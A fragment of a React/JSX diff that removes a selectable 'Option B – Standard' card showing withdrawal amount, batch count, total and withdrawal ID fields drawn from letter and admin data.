-              <Card className={`h-full border-2 cursor-pointer transition-all duration-300 ${selectedOption === 'B' ? 'border-slate-400 ring-4 ring-slate-200 shadow-xl' : 'border-slate-200 hover:border-slate-300 hover:shadow-lg'}`} onClick={() => handleSelect('B')} data-testid="card-option-b">
-                <CardHeader className="bg-slate-50 border-b border-slate-100 pb-4">
-                  <div className="flex justify-between items-start">
-                    <div>
-                      <div className="text-xs font-bold text-slate-500 uppercase tracking-wider mb-1">Option B – Standard</div>
-                      <CardTitle className="text-2xl font-bold text-slate-900">{letter.optionBTitle}</CardTitle>
-                    </div>
-                    <div className="h-10 w-10 rounded-full bg-slate-100 flex items-center justify-center text-slate-600 font-bold">B</div>
-                  </div>
-                </CardHeader>
-                <CardContent className="pt-6 space-y-4">
-                  {letter.optionBDescription && (
-                    <p className="text-sm text-slate-600">{letter.optionBDescription}</p>
-                  )}
-                  <div className="flex justify-between items-baseline">
-                    <span className="text-2xl font-bold text-slate-700">{letterContent?.optionBAmount || `Half (${parseInt(adminData?.withdrawalAmount || "0") / 2})`}</span>
-                  </div>
-                  <div className="space-y-3 pt-2">
-                    {letterContent?.optionBBatches ? (
-                      <div className="text-sm text-slate-600 whitespace-pre-line">{letterContent.optionBBatches}</div>
-                    ) : (
-                      <div className="flex justify-between text-sm py-2 border-b border-slate-100">
-                        <span className="text-slate-600">Total Batches</span>
-                        <span className="font-semibold text-slate-900">{parseInt(adminData?.withdrawalBatches || "0") * 2} Transfers</span>
-                      </div>
-                    )}
-                    {letterContent?.optionBTotalAmount && (
-                      <div className="flex justify-between text-sm py-2 border-b border-slate-100 font-semibold">
-                        <span className="text-slate-600">Total Withdrawal</span>
-                        <span className="text-slate-900">{letterContent.optionBTotalAmount}</span>
-                      </div>
-                    )}
-                    <div className="flex justify-between text-sm py-2 bg-slate-100 px-3 rounded text-slate-900">
-                      <span className="font-semibold">Withdrawal ID</span>
-                      <span className="font-bold">{letterContent?.optionBFilelocoId || adminData?.physilocal0}</span>
-                    </div>
-                  </div>
-                </CardContent>
-                <CardFooter className="pt-2 pb-6">
-                  <Button className="w-full" variant={selectedOption === 'B' ? 'secondary' : 'outline'} data-testid="button-select-b">Select Option B</Button>
-                </CardFooter>
-              </Card>
-            </motion.div>
-              </div>
-            </>
-          )}
         </motion.div>
       </main>
 
